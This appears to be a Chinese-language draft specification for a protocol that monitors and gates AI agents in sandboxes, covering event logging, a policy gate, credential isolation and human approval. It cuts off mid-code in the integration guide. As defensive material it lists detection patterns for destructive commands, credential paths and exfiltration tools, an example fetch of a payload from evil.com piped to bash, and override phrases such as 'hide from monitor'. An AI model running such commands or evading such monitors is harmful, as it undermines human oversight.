# AMP 协议规范 v1.0

**Agent Monitoring Protocol**

**状态：** 草案
**版本：** 1.0.0
**最后更新：** 2025-03

---

## 目录

1. 引言
2. 架构
3. 边界模型
4. 事件系统
5. 安全门
6. LLM 代理与凭证隔离
7. Human-in-the-Loop（HITL）
8. Agent 生命周期
9. 敏感数据保险库
10. API 参考
11. 消息模式
12. 时序图
13. 集成指南
14. 最佳实践

---

## 1. 引言

### 1.1 什么是 AMP？

AMP（Agent Monitoring Protocol）是一套定义在 AI Agent 与其沙盒平台之间的结构化边界协议。它是 Paddock 的核心创新。

AMP **不是** Agent 框架，也 **不是** 模型协议。它定义的是：

- 工具调用如何被**监控**与**审查**
- Agent 行为如何被**复核**与**评分**
- 事件如何被**上报**、**存储**与**审计**
- 外部能力如何在跨边界时被**显式暴露**
- 快照与回滚如何与命令和事件建立**关联**

### 1.2 设计理念

AMP 的目标不是控制 Agent 的思考过程，而是控制 **Agent 与环境之间的边界**。

**核心原则：**

1. **完整环境，而不是阉割环境**：Agent 运行在完整的 Linux 系统中，而不是受限 shell 中。能力被保留，边界在协议层被约束。
2. **能力留在内部，边界保持显式**：本地工具（文件 I/O、exec、browser）在沙盒内执行。任何跨出沙盒边界的动作都必须经过显式协议接口。
3. **默认可观测**：每个关键动作都会生成结构化事件，不允许静默执行。
4. **以审查为主，而不是默认阻断**：已知危险由确定性规则识别，新型模式由行为分析识别，边缘案例由 HITL 兜底。
5. **Agent 无关**：AMP 可以与任意 Agent 框架集成。OpenClaw 是参考实现，但同样可以为 LangChain、AutoGPT 或自定义 Agent 构建 AMP 适配层。

### 1.3 设计目标

| 目标 | 指标 |
|------|------|
| 安全优先 | 多层防御：确定性规则、污点追踪、行为分析、信任评分 |
| 零信任 | API Key 永远不进入沙盒；所有工具调用都必须经过 gate |
| 可观测 | 每个 Agent 动作都生成结构化事件，便于审计与分析 |
| 可扩展 | 插件化架构支持任意 Agent 框架 |
| 人类监督 | 内建 HITL 体系，适用于高风险操作 |

---

## 2. 架构

AMP 跨越三个架构层工作：

### 2.1 Control Plane（宿主机）

Control Plane 运行在宿主机上，负责编排所有 session。

```text
Control Plane (:3100)
├── Session Manager      — 创建、启动、暂停、终止 session
├── Event Store          — SQLite + SHA-256 哈希链
├── LLM Relay            — 注入 API Key，转发到真实 LLM API
├── HITL Arbiter         — 基于策略的审批引擎
├── Snapshot Manager     — VM 快照创建与恢复
├── Cron Manager         — 定时 Agent 行为
├── MCP Gateway          — 外部能力路由
├── Resource Gateway     — 资源边界控制
├── REST API             — 提供给 Dashboard 与集成方的 HTTP 接口
└── WebSocket Streams    — 实时事件流
```

**技术栈：** Node.js、Fastify、SQLite（better-sqlite3）、BoxLite SDK

### 2.2 Sidecar（沙盒内部）

Sidecar 运行在 MicroVM 内，与 Agent 进程并存。

```text
Sidecar
├── LLM Proxy (:8800)    — 拦截 Agent 的 LLM 请求
│   ├── Adversarial Detection  — 扫描绕过监控的尝试
│   ├── Sensitive Data Vault   — 在到达 LLM 前遮蔽敏感数据
│   └── Intent Extraction      — 从 LLM 响应中提取工具意图
├── AMP Gate (:8801)     — 工具调用审批的策略门
│   ├── Rule Engine       — 确定性模式匹配
│   ├── Taint Tracker     — 数据流安全标签
│   ├── Behavior Analyzer — 序列模式检测
│   └── Trust Scorer      — Session 级信任衰减
├── Event Reporter       — 通过 HTTP 将事件发送给 Control Plane
├── FS Watcher           — 监控工作区文件系统变化
├── Agent Monitor        — 跟踪 Agent 进程健康与生命周期
└── Control Plane Client — 与宿主机通信的客户端
```

**技术栈：** Node.js、原生 HTTP server、Chokidar、进程监控

### 2.3 Agent（沙盒内部）

Agent 是运行在沙盒中的 AI Agent 框架本体。

**当前支持：** OpenClaw（参考实现）

**集成点：**

- **LLM 请求** → `http://localhost:8800/{provider}`（LLM Proxy）
- **工具调用** → `POST /amp/gate`（AMP Gate 审批）
- **生命周期事件** → `/amp/agent/*`（ready、error、exit）
- **用户命令** → `/tmp/paddock-commands.jsonl`（命令文件轮询）

---

## 3. 边界模型

AMP 将每个工具与能力划分到四种边界类型之一。这个分类决定了该操作如何被监控、审查与路由。

### 3.1 `sandbox-local`

完全在 guest VM 内完成的操作。

| 工具 | 说明 |
|------|------|
| `read` | 读取沙盒文件 |
| `write` | 写入沙盒文件 |
| `edit` | 编辑沙盒文件 |
| `apply_patch` | 给沙盒文件打补丁 |
| `exec` | 在 VM 内执行命令 |
| `process` | 管理后台进程 |
| `browser` | 驱动 VM 内本地浏览器 |
| `web_search` | 在 VM 内执行网页搜索 |
| `web_fetch` | 在 VM 内抓取远程网页内容 |
| `memory_search` | 搜索本地 Agent memory |
| `memory_get` | 读取本地 Agent memory |
| `image` | 分析本地图像 |
| `pdf` | 分析本地 PDF |
| `agents_list` | 查看本地 Agent 配置 |

**规则：**

- 必须在 guest VM 内完成，不允许静默回退到宿主机
- 执行前必须经过 `POST /amp/gate`
- 执行后必须通过 `POST /amp/event` 上报结果
- 监控层：`amp-gate`

### 3.2 `control-plane-routed`

对 Agent 来说看起来像本地操作，但其全局真相由 Control Plane 维护。

| 工具 | 说明 |
|------|------|
| `sessions_list` | 列出 Paddock sessions |
| `sessions_history` | 读取 session 历史 |
| `sessions_send` | 向另一个 session 发送命令 |
| `sessions_spawn` | 创建一个子 Agent session |
| `sessions_yield` | 挂起，等待子 Agent 完成 |
| `session_status` | 读取 session 状态 |
| `subagents` | 管理已创建的子 Agent |
| `cron` | 调度未来的 Agent 行为 |
| `rollback` | 恢复 checkpoint 或快照 |

**规则：**

- Agent 可以使用这些工具
- 沙盒绝不能私自维护全局状态副本
- 监控层：`amp-control`

### 3.3 `mcp-external`

真正离开沙盒、依赖宿主机或外部服务的操作。

| 工具模式 | 说明 |
|---------|------|
| `message` | 发送外部 channel 消息 |
| `canvas` | 驱动宿主机或远程 canvas 表面 |
| `nodes` | 访问宿主机挂接或远端节点/设备 |
| `tts` | 使用外部文本转语音能力 |
| `browser.*` | 宿主侧 browser bridge 操作 |
| `clipboard.*` | 宿主剪贴板操作 |
| `tts.*` | 外部 TTS 操作 |
| `applescript.*` | 宿主 AppleScript 操作 |
| `channel.*` | 外发 channel 操作 |
| `api.*` | 依赖凭证的外部 API |

**规则：**

- 必须显式跨越边界
- 宿主权限绝不允许静默泄漏给沙盒
- 监控层：`mcp`

### 3.4 `disabled`

不允许在沙盒中使用的能力。

| 工具 | 原因 |
|------|------|
| `gateway` | 禁止沙盒内部进行 gateway 自管理 |

### 3.5 边界分类算法

```typescript
function classifyToolBoundary(toolName: string): Boundary {
  // 1. 检查精确匹配表
  if (EXACT_BOUNDARIES.has(toolName)) return EXACT_BOUNDARIES.get(toolName);

  // 2. 检查前缀匹配表
  for (const { prefix, boundary } of PREFIX_BOUNDARIES) {
    if (toolName.startsWith(prefix)) return boundary;
  }

  // 3. 默认：disabled
  return 'disabled';
}
```

---

## 4. 事件系统

### 4.1 事件类型

AMP 将结构化事件分为六大类：

#### 意图层（LLM 与工具规划）

| 事件类型 | 说明 |
|---------|------|
| `llm.request` | Agent 发送 LLM 请求（模型、提供商、消息数、工具数） |
| `llm.response` | LLM 返回响应（输入/输出 token、耗时、内容预览） |
| `tool.intent` | Agent 声明工具调用意图（工具名、输入、关联 ID） |
| `tool.result` | 工具执行结果 |
| `agent.thought` | Agent 推理/思考块，包括可选的意图自述 |

#### 效果层（可观测动作）

| 事件类型 | 说明 |
|---------|------|
| `amp.fs.change` | 检测到文件系统修改 |
| `amp.net.egress` | 外发网络请求 |
| `amp.process.spawn` | 新进程被拉起 |

#### 系统层（Session 管理）

| 事件类型 | 说明 |
|---------|------|
| `amp.session.start` | Session 创建并启动（包含部署阶段） |
| `amp.session.end` | Session 终止 |
| `amp.snapshot.created` | VM 快照已创建 |
| `amp.snapshot.restored` | VM 已从快照恢复 |

#### HITL 层（人工监督）

| 事件类型 | 说明 |
|---------|------|
| `amp.hitl.request` | 工具调用需要人工审批 |
| `amp.hitl.decision` | 用户批准 / 拒绝 / 修改 |

#### 安全层（策略执行）

| 事件类型 | 说明 |
|---------|------|
| `amp.gate.verdict` | 安全门的裁决（verdict、风险分、命中的规则） |

#### Agent 生命周期层

| 事件类型 | 说明 |
|---------|------|
| `amp.agent.ready` | Agent 初始化完成并就绪 |
| `amp.agent.heartbeat` | 周期性健康检查 |
| `amp.agent.error` | 出现可恢复错误 |
| `amp.agent.fatal` | 致命错误，Agent 即将退出 |
| `amp.agent.exit` | Agent 进程已终止 |

#### 用户层

| 事件类型 | 说明 |
|---------|------|
| `amp.user.command` | 用户从 Dashboard 发送了命令 |

### 4.2 事件格式

所有事件都遵循 `AMPEvent` schema：

```typescript
interface AMPEvent {
  id: string;              // 唯一事件 ID（nanoid）
  sessionId: string;       // Session 标识符
  seq: number;             // 单调递增序号
  timestamp: number;       // Unix 时间戳（ms）
  type: AMPEventType;      // 事件类型
  payload: Record<string, unknown>;  // 事件特定数据
  correlationId?: string;  // 关联相关事件（如 tool intent → verdict → result）
  causedBy?: string;       // 父事件 ID
  snapshotRef?: string;    // 关联的快照 ID
}
```

### 4.3 事件存储与完整性

事件通过 SQLite 存储，并带有密码学完整性保证：

```sql
CREATE TABLE events (
  id             TEXT PRIMARY KEY,
  session_id     TEXT NOT NULL,
  seq            INTEGER NOT NULL,
  timestamp      INTEGER NOT NULL,
  type           TEXT NOT NULL,
  payload        TEXT NOT NULL,     -- JSON
  correlation_id TEXT,
  caused_by      TEXT,
  snapshot_ref   TEXT,
  prev_hash      TEXT,              -- 前一条事件的哈希
  hash           TEXT,              -- 当前事件的哈希
  rolled_back    INTEGER DEFAULT 0  -- 回滚时做标记
);
```

**哈希链公式：**

```text
hash = SHA256(prev_hash + id + seq + type + payload)
```

这会形成一条不可篡改的审计链。一旦任意事件被修改，哈希链就会断裂，完整性违规能够被检测出来。

### 4.4 事件流

```text
Agent 执行动作
  → Sidecar 拦截
    → Policy Gate 评估（4 层）
      → 如果 approve：执行并向 Control Plane 上报事件
      → 如果 ask：发起 HITL 请求，等待人工决策
      → 如果 reject：阻断执行并上报 verdict 事件
    → Control Plane 将事件追加写入带哈希链的 Event Store
      → Dashboard 通过 WebSocket 收到实时流
```

---

## 5. 安全门

Policy Gate 是 AMP 的核心安全机制。每一次工具调用在执行前都必须经过它。

### 5.1 第一层：确定性规则引擎

基于工具名和参数进行模式评估：

- **命令注入检测**：反引号、`$(...)`、子 shell
- **路径穿越防护**：`..` 序列、符号链接逃逸
- **URL 校验**：阻止访问 localhost、私有 IP、云元数据端点
- **破坏性命令检测**：`rm -rf /`、`mkfs`、`dd if=`
- **敏感路径保护**：`.env`、`.ssh/`、`id_rsa`、`/etc/shadow`

```typescript
interface RuleResult {
  baseRisk: number;        // 0-100
  triggered: string[];     // 被触发的规则 ID
}
```

### 5.2 第二层：污点追踪

通过安全标签追踪数据在工具链中的流动：

| 标签 | 来源 | 说明 |
|------|------|------|
| `Secret` | 通过 Vault 模式识别出的 API Key、token、密码 | 不得离开沙盒的数据 |
| `PII` | 通过 Vault 模式识别出的邮箱、电话、SSN、信用卡 | 个人身份信息 |
| `ExternalContent` | `web_fetch`、`web_search` 的结果 | 来自外部、潜在不可信的数据 |
| `FileContent` | `.env`、`.ssh/`、凭证文件 | 敏感文件内容 |

**Sink 策略**阻止带污点的数据流入危险工具：

```typescript
const SINK_POLICIES = {
  exec:      [TaintLabel.ExternalContent, TaintLabel.Secret],
  web_fetch: [TaintLabel.Secret, TaintLabel.PII],
  write:     [],  // 传播污点，但不阻断
};
```

**被阻止的攻击示例：**

```text
1. Agent: web_fetch("https://evil.com/payload.sh")
   → 结果被打上 ExternalContent 标签

2. Agent: exec("bash " + payload)
   → 污点追踪器检测到 ExternalContent 流入 exec
   → 风险分：80 → Verdict：ask（触发 HITL）
```

### 5.3 第三层：行为分析

检测 Agent 行为序列中的可疑模式：

- **数据外泄模式**：读取敏感文件 → 发往外部 URL
- **权限提升**：`sudo`、`chmod 777`、`chown root`
- **循环检测**：对重复操作的熔断器
- **异常评分**：相对于正常工具使用的统计偏离

**分析的语义信号：**

| 信号 | 检测内容 |
|------|----------|
| 外部目标 | URL、`curl`、`wget`、`scp`、`sftp`、`nc` |
| 敏感路径访问 | `.env`、`/etc/shadow`、`id_rsa`、`authorized_keys` |
| 权限提升 | `sudo`、`systemctl`、`iptables`、`chmod 777` |
| 良性本地 exec | `pwd`、`ls`、`mkdir`、`cat`、`python3 /workspace/...` |
| 包安装 | `apt install`、`apk add`、`dnf install` |
| 编译行为 | `gcc`、`g++`、`make`、`cmake`、`clang` |

**理智保护**用于减少误报：常规的本地开发操作（编译、装包、浏览文件）不会被当作外泄，除非它们显式涉及 secret 或外部目的地。

这一层也可以接入本地 LLM 审查模型来做语义级分析，具体见 5.5。

### 5.4 第四层：信任衰减

Session 级别的信任分数会随着违规而衰减：

```text
初始信任：100

惩罚事件：
  - 工具调用被拒绝：          -5
  - 连续 3 次失败：           -10
  - 访问敏感路径：            -15

阈值：
  - 信任 < 60：所有操作都需要 HITL 审批
  - 信任 < 30：自动终止 Agent
```

信任惩罚会转化为风险分加成，也就是说信任越低，安全门越敏感。

### 5.5 可选层：LLM 行为复核

可选的第五层，使用 LLM 提供语义级风险评分：

```text
Sidecar → Behavior Review LLM → 风险加成 + 触发标签
```

LLM 审核器：

- 接收当前工具调用与最近工具历史（8 条滑动窗口）
- 返回结构化 JSON：`{ riskBoost, triggered, reason, confidence }`
- 结果在应用前会被 clamp，并经过理智保护
- 支持 Ollama（本地）与 OpenAI 兼容 API

这一层**只做加法**，只能提高风险分，绝不会覆盖确定性的拒绝结果。

### 5.6 裁决分级

| 风险分 | Verdict | 动作 |
|--------|---------|------|
| 0–30 | `approve` | 立即执行 |
| 31–70 | `approve` | 带告警执行（只记录，不阻断） |
| 71–90 | `ask` | 需要 HITL 审批；Agent 阻塞等待人工决定 |
| 91–100 | `reject` | 阻断执行；Agent 收到拒绝原因 |

---

## 6. LLM 代理与凭证隔离

### 6.1 架构

```text
Agent（沙盒）        Sidecar（沙盒）         Control Plane（宿主机）   LLM API
     │                    │                          │                  │
     │── POST /anthropic ─►│                          │                  │
     │   /v1/messages      │                          │                  │
     │   （伪 API key）     │                          │                  │
     │                    │── Adversarial scan ──►   │                  │
     │                    │── Vault: mask secrets ─► │                  │
     │                    │── Forward to CP ────────►│                  │
     │                    │   （不带真实 API key）    │── 注入真实 key ─►│
     │                    │                          │                  │
     │                    │                          │◄── LLM 响应 ────│
     │                    │◄── response ────────────│                  │
     │                    │── Vault: unmask ────►    │                  │
     │◄── response ──────│                          │                  │
     │                    │                          │                  │
     │                    │── Report llm.request ───►│                  │
     │                    │── Report llm.response ──►│                  │
```

### 6.2 安全层

**第 0 层：对抗性检测**

扫描 Agent 消息中试图绕过系统的提示：

```text
检测模式包括：
  - "ignore paddock"
  - "don't declare intent"
  - "hide from monitor"
  - "disregard system prompt"
  - "override instructions"
  - "pretend you are"
  - "always say routine"
```

命中会以 `amp.gate.verdict` 事件上报，但不会直接阻断请求。

**第 1 层：敏感数据保险库**

Vault 会扫描发往 LLM 的请求，将敏感数据替换为占位符：

```text
Agent 发送： "My API key is sk-ant-api03-abc123..."
LLM 接收：   "My API key is {{PADDOCK_SECRET_1}}"
LLM 返回：   "I see your key is {{PADDOCK_SECRET_1}}"
Agent 收到： "I see your key is sk-ant-api03-abc123..."
```

LLM **永远看不到真实 secret**。Event Store **永远不会记录真实 secret**。Dashboard **永远不会展示真实 secret**。

检测类别包括：API key（Anthropic、OpenAI、OpenRouter、GitHub、AWS、Slack、Discord、Telegram）、SSH 私钥、PGP 密钥、数据库连接串、密码、JWT、Bearer token、PII（邮箱、电话、信用卡、SSN）。

**第 2 层：API Key 隔离**

API Key 保存在宿主机，**永不进入沙盒**。

- Agent 使用 `api_key="paddock-proxy"`（伪 key）
- LLM Proxy 会移除请求中的任何认证头
- Control Plane 在转发给 LLM provider 时注入真实 key

### 6.3 支持的 Provider

| Provider | 代理路径 | 认证头 | 环境变量 |
|----------|----------|--------|----------|
| Anthropic | `/anthropic` | `x-api-key` | `ANTHROPIC_API_KEY` |
| OpenAI | `/openai` | `Authorization` | `OPENAI_API_KEY` |
| OpenRouter | `/openrouter` | `Authorization` | `OPENROUTER_API_KEY` |
| Google | `/google` | `x-goog-api-key` | `GOOGLE_API_KEY` |

### 6.4 意图提取

LLM Proxy 会从 LLM 响应中提取工具意图，并上报为 `tool.intent` 事件，从而支持执行前分析：

- 对于 Anthropic 风格响应：提取 `tool_use` 块和 `thinking` 块
- 对于 OpenAI 风格响应：提取 `function` / `tool_calls` 块
- 同时支持 JSON 与 SSE（流式）响应格式

### 6.5 可选能力：意图注入

AMP 还定义了一种可选的 `intent injection` 模式，用来增强可观测性。在这种模式下，适配层或代理层会向模型提示中附加结构化说明，要求模型显式描述：

- 当前目标是什么
- 计划执行什么工具或动作
- 为什么选择这个动作
- 它声称自己所理解的边界与安全前提是什么

模型返回的这类“自述意图”只作为**补充证据**，不是事实来源。真正权威的仍然是实际工具 payload、gate verdict 与观测到的执行效果。

意图注入可以增强 `agent.thought` 与 `tool.intent` 事件，提升人工审查质量，也能为后续行为分析器提供额外上下文。它属于协议支持的可选能力，不要求必须由 LLM Proxy 实现，也可以由具体的 AMP adapter 原生实现。

---

## 7. Human-in-the-Loop（HITL）

### 7.1 流程

```text
Agent → tool_use → Sidecar → Policy Gate → 风险分 71-90
                                             ↓
                                   amp.hitl.request 事件
                                             ↓
                             Control Plane → Dashboard 通知
                                             ↓
                                  用户：Approve / Reject / Modify
                                             ↓
                                   amp.hitl.decision 事件
                                             ↓
                                   Sidecar → 继续或阻断
```

### 7.2 HITL 策略

可按工具配置审批策略：

```typescript
interface HITLPolicy {
  toolPattern: string;  // 支持通配符：'exec'、'host.*'
  action: 'approve' | 'block' | 'ask';
}

// 默认策略
const DEFAULT_POLICIES: HITLPolicy[] = [
  { toolPattern: 'read',       action: 'approve' },
  { toolPattern: 'edit',       action: 'approve' },
  { toolPattern: 'write',      action: 'approve' },
  { toolPattern: 'exec',       action: 'ask' },
  { toolPattern: 'web_search', action: 'approve' },
  { toolPattern: 'web_fetch',  action: 'approve' },
  { toolPattern: 'browser',    action: 'ask' },
  { toolPattern: 'host.*',     action: 'ask' },
];
```

### 7.3 HITL 请求格式

```typescript
interface HITLRequest {
  id: string;
  sessionId: string;
  toolName: string;
  toolArgs: Record<string, unknown>;
  reason: string;
  riskScore?: number;
  triggeredRules?: string[];
  timestamp: number;
}
```

### 7.4 HITL 决策格式

```typescript
interface HITLDecision {
  requestId: string;
  verdict: 'approved' | 'rejected' | 'modified';
  modifiedArgs?: Record<string, unknown>;
  decidedAt: number;
}
```

### 7.5 超时

HITL 请求在 **5 分钟** 后超时。超时请求会被自动判定为 **rejected**。

---

## 8. Agent 生命周期

### 8.1 生命周期状态

```text
Created → Running → Ready → Active → (Error) → Exit
```

| 状态 | 说明 |
|------|------|
| **Created** | Session 已创建，但 VM 尚未启动 |
| **Running** | VM 已启动，Sidecar 正在初始化 |
| **Ready** | Agent 已通过 `amp.agent.ready` 报告就绪 |
| **Active** | Agent 正在执行任务 |
| **Error** | 出现可恢复错误 |
| **Exit** | Agent 已终止（正常退出或崩溃） |

### 8.2 注册时序

1. Control Plane 使用环境变量启动 VM
2. Sidecar 初始化：解析 Control Plane URL，启动 LLM Proxy（:8800），启动 AMP Gate（:8801）
3. Agent 在 VM 内启动
4. Agent 通过 AMP 适配层上报 ready：`POST /amp/agent/ready`
5. Dashboard 收到 `amp.agent.ready` 事件

### 8.3 心跳

Agent Monitor 会周期性发送 heartbeat：

- **心跳间隔：** 每 30 秒
- **存活检查：** 每 10 秒通过 `pgrep`
- **负载：** agent 名称、运行时长、内存使用、待处理任务

### 8.4 错误上报

```typescript
interface AMPAgentError {
  category: 'config' | 'network' | 'auth' | 'resource' | 'runtime' | 'dependency';
  code: string;        // 例如 'ERR_NO_API_KEY'
  message: string;
  recoverable: boolean;
  context?: Record<string, unknown>;
}
```

| Code | Category | 说明 | 可恢复 |
|------|----------|------|--------|
| `ERR_NO_API_KEY` | auth | API key 未配置 | 否 |
| `ERR_RATE_LIMIT` | resource | 命中速率限制 | 是 |
| `ERR_LLM_UNAVAILABLE` | network | LLM API 不可达 | 是 |
| `ERR_LLM_UPSTREAM` | runtime | LLM API 返回错误 | 可能 |
| `ERR_TOOL_BLOCKED` | security | 工具被策略阻断 | 否 |
| `ERR_TOOL_EXEC` | runtime | 工具执行失败 | 是 |
| `ERR_AGENT_CRASH` | runtime | Agent 崩溃 | 否 |

### 8.5 崩溃检测

如果 Agent 进程消失（通过 `pgrep` 检测），Agent Monitor 会上报：

```typescript
{
  type: "amp.agent.exit",
  payload: { agent: "openclaw", exitCode: -1, reason: "crash" }
}
```

---

## 9. 敏感数据保险库

### 9.1 概述

Sensitive Data Vault 是 LLM Proxy 中的双向过滤器，用来确保 secret 永不进入 LLM，也永不出现在事件日志中。

### 9.2 检测模式

检测模式按特异性排序（优先级 10 最高）：

| 类别 | 模式 | 优先级 |
|------|------|--------|
| Anthropic API Key | `sk-ant-*` | 10 |
| OpenAI API Key | `sk-proj-*`、`sk-*` | 10 |
| OpenRouter API Key | `sk-or-*` | 10 |
| GitHub Token | `ghp_*`、`ghs_*`、`github_pat_*` | 10 |
| AWS Access Key | `AKIA*` | 10 |
| SSH Private Key | `-----BEGIN * PRIVATE KEY-----` | 10 |
| PGP Private Key | `-----BEGIN PGP PRIVATE KEY BLOCK-----` | 10 |
| JWT | `eyJ*.eyJ*.*` | 9 |
| DB Connection String | `mongodb://`、`postgres://`、`redis://` | 9 |
| Bearer Token | `Bearer *` | 8 |
| Credit Card | 通过 Luhn 校验的模式 | 8 |
| SSN | `NNN-NN-NNNN` | 8 |
| Password Field | 常见键值对密码模式 | 7 |
| Email | 标准邮箱正则 | 3 |
| Phone | 标准电话号码正则 | 3 |

### 9.3 脱敏流程

```text
出站（Agent → LLM）：
  1. 用所有模式扫描请求体
  2. 将命中的值替换为 {{PADDOCK_SECRET_N}}
  3. 映射关系仅保存在内存中（绝不离开 VM）
  4. 将脱敏后的请求体转发给 Control Plane

入站（LLM → Agent）：
  1. 扫描响应中的 {{PADDOCK_SECRET_N}} 占位符
  2. 恢复原始值
  3. 将还原后的结果返回给 Agent
```

### 9.4 允许列表

某些看起来像 secret 但实际不是的值会进入 allowlist：

- `paddock-proxy`（伪 API key）
- `localhost`、`host.internal`
- `true`、`false`、`null`、`undefined`

---

## 10. API 参考

### 10.1 Control Plane REST API（`:3100`）

#### Session 管理

| 方法 | 路径 | 说明 |
|------|------|------|
| `POST` | `/api/sessions` | 创建一个新 session |
| `GET` | `/api/sessions` | 列出所有 session |
| `GET` | `/api/sessions/:id` | 获取 session 详情 |
| `POST` | `/api/sessions/:id/start` | 启动 session（拉起 VM） |
| `POST` | `/api/sessions/:id/stop` | 停止 session |
| `POST` | `/api/sessions/:id/deploy-agent` | 向正在运行的 session 部署 agent |
| `DELETE` | `/api/sessions/:id` | 删除 session |
| `POST` | `/api/sessions/:id/command` | 向 agent 发送命令 |
| `POST` | `/api/sessions/:id/commands/abort` | 中止正在运行的命令 |

#### 事件管理

| 方法 | 路径 | 说明 |
|------|------|------|
| `GET` | `/api/sessions/:id/events` | 获取某个 session 的事件 |
| `POST` | `/api/sessions/:id/events` | 追加事件（供 Sidecar 使用） |
| `WS` | `/ws/sessions/:id` | 实时事件的 WebSocket 流 |

#### HITL 管理

| 方法 | 路径 | 说明 |
|------|------|------|
| `GET` | `/api/sessions/:id/hitl/pending` | 获取待处理的 HITL 请求 |
| `POST` | `/api/sessions/:id/hitl` | 提交 HITL 决策 |

#### Snapshot 管理

| 方法 | 路径 | 说明 |
|------|------|------|
| `POST` | `/api/sessions/:id/snapshots` | 创建一个快照 |
| `GET` | `/api/sessions/:id/snapshots` | 列出快照 |
| `POST` | `/api/sessions/:id/snapshots/:snapshotId/restore` | 从快照恢复 |

#### 配置

| 方法 | 路径 | 说明 |
|------|------|------|
| `GET` | `/api/health` | 健康检查（包含已配置 provider 与 warning） |
| `GET` | `/api/config/llm` | 获取 LLM provider 配置 |
| `POST` | `/api/config/llm` | 更新 LLM API key |

### 10.2 Sidecar API（`:8801`）

| 方法 | 路径 | 说明 |
|------|------|------|
| `POST` | `/amp/gate` | 通过安全门评估工具调用 |
| `POST` | `/amp/agent/ready` | Agent 上报 ready |
| `POST` | `/amp/agent/error` | Agent 上报错误 |
| `POST` | `/amp/agent/exit` | Agent 上报退出 |
| `POST` | `/amp/event` | 上报自定义事件 |
| `POST` | `/amp/command` | 接收用户命令（来自 Control Plane） |
| `GET` | `/amp/health` | Sidecar 健康检查 |

### 10.3 LLM Proxy（`:8800`）

| 方法 | 路径 | 说明 |
|------|------|------|
| `POST` | `/anthropic/*` | 代理到 Anthropic API |
| `POST` | `/openai/*` | 代理到 OpenAI API |
| `POST` | `/openrouter/*` | 代理到 OpenRouter API |
| `POST` | `/google/*` | 代理到 Google API |

### 10.4 端口参考

| 端口 | 服务 | 说明 |
|------|------|------|
| 3100 | Control Plane | REST API 与 WebSocket |
| 3200 | Dashboard | Web UI（开发服务器） |
| 8800 | LLM Proxy | Sidecar 内 LLM 代理（VM 内） |
| 8801 | AMP Gate | Sidecar 内策略门（VM 内） |
| 6080 | noVNC HTTP | computer-box 图形访问 |
| 6443 | noVNC HTTPS | computer-box 图形访问（安全） |

---

## 11. 消息模式

### 11.1 Gate 请求与裁决

```typescript
interface AMPGateRequest {
  correlationId: string;
  toolName: string;
  toolInput: Record<string, unknown>;
}

interface AMPGateVerdict {
  verdict: 'approve' | 'reject' | 'ask';
  riskScore: number;          // 0-100
  triggeredRules: string[];   // 被触发的规则 ID
  behaviorFlags?: string[];   // 行为分析标志
  reason?: string;            // 面向人的解释
}
```

### 11.2 Session

```typescript
interface Session {
  id: string;
  status: 'created' | 'running' | 'paused' | 'terminated' | 'error';
  agentType: string;
  sandboxType: 'simple-box' | 'computer-box';
  createdAt: number;
  updatedAt: number;
  vmId?: string;
  guiPorts?: { httpPort: number; httpsPort: number };
  agentConfig?: { provider: string; model: string };
}
```

### 11.3 污点类型

```typescript
enum TaintLabel {
  Secret = 'Secret',
  PII = 'PII',
  ExternalContent = 'ExternalContent',
  FileContent = 'FileContent',
}

interface TaintEntry {
  value: string;
  labels: Set<TaintLabel>;
  source: string;
  firstSeen: number;
}
```

### 11.4 信任画像

```typescript
interface TrustProfile {
  score: number;          // 0-100
  anomalyCount: number;
  penaltyBoost: number;   // 叠加到风险分上的加成
}
```

---

## 12. 时序图

### 12.1 Session 启动

```text
User        Dashboard     Control Plane   Sandbox Driver   VM / Sidecar    Agent
 │               │               │               │               │           │
 │── Create ────►│               │               │               │           │
 │               │── POST ──────►│               │               │           │
 │               │  /sessions    │               │               │           │
 │               │◄── Session ──│               │               │           │
 │               │               │               │               │           │
 │── Start ─────►│               │               │               │           │
 │               │── POST ──────►│               │               │           │
 │               │  /start       │── createVM ──►│               │           │
 │               │               │               │── start VM ──►│           │
 │               │               │               │               │── init ──►│
 │               │               │               │               │◄─ ready ─│
 │               │               │◄── vmId ─────│               │           │
 │               │               │── event ─────►│               │           │
 │               │◄── Session ──│               │               │           │
 │◄── Started ──│               │               │               │           │
```

### 12.2 带 Policy Gate 的工具调用

```text
Agent        Sidecar / Gate   Control Plane   Dashboard / User
 │               │                  │                │
 │── tool_use ──►│                  │                │
 │               │── evaluate ──►   │                │
 │               │  (4 layers)      │                │
 │               │◄── verdict ──    │                │
 │               │                  │                │
 │  [if risk > 70]                  │                │
 │               │── hitl.request ─►│                │
 │               │                  │── notify ─────►│
 │               │                  │◄── decision ──│
 │               │◄── approved ────│                │
 │               │                  │                │
 │◄── approved ─│                  │                │
 │── execute ──►│                  │                │
 │◄── result ──│                  │                │
 │               │── tool.result ──►│                │
```

### 12.3 LLM 请求流

```text
Agent        Sidecar / Proxy    Control Plane / Relay    LLM API
 │               │                      │                  │
 │── POST /anthropic/v1/messages ──────►│                  │
 │   (dummy API key)                    │                  │
 │               │── adversarial scan   │                  │
 │               │── vault: mask ──────►│                  │
 │               │── forward ──────────►│                  │
 │               │   (no real key)      │── inject key ──►│
 │               │                      │── POST ────────►│
 │               │                      │◄── response ───│
 │               │◄── response ────────│                  │
 │               │── vault: unmask      │                  │
 │◄── response ─│                      │                  │
 │               │                      │                  │
 │               │── llm.request ──────►│                  │
 │               │── llm.response ─────►│                  │
```

---

## 13. 集成指南

### 13.1 集成一个新的 Agent

AMP 可以与任意 Agent 框架集成。参考实现是 Python 的 `paddock-amp` 适配器。

**步骤 1：安装 AMP 适配器**

```bash
pip install paddock-amp
```

**步骤 2：初始化**

```python
from paddock_amp import PaddockAMPPlugin

plugin = PaddockAMPPlugin(
    sidecar_url="http://localhost:8801",
    agent_version="1.0.0"
)
```

**步骤 3：上报 Ready**

```python
plugin.report_ready(capabilities=["read", "write", "exec", "web_fetch"])
```

**步骤 4：为工具调用加 Gate**

```python
def execute_tool(tool_name: str, tool_input: dict) -> dict:
    # 向 Policy Gate 请求审批
    verdict = plugin.before_tool_call(tool_name, tool_input)

    if verdict["verdict"] == "reject":
        raise ToolBlockedError(verdict["reason"])

    # 执行工具
    result = actual_tool_execution(tool_name, tool_input)

    # 上报结果，供污点追踪使用
    plugin.after_tool_call(tool_name, result)

    return result
```

**步骤 5：代理 LLM 请求**

```python
from anthropic import Anthropic

client = Anthropic(
    api_key="paddock-proxy",  # 伪 key，真实 key 由 Control Plane 注入
    base_url="http://localhost:8800/anthropic"
)
```

**步骤 6：轮询用户命令**

```python
plugin.on_command(lambda cmd: print(f"User command: {cmd}"))
plugin.start_command_polling(interval=1.0)
```

**步骤 7：处理错误与退出**

```python
import atexit

try:
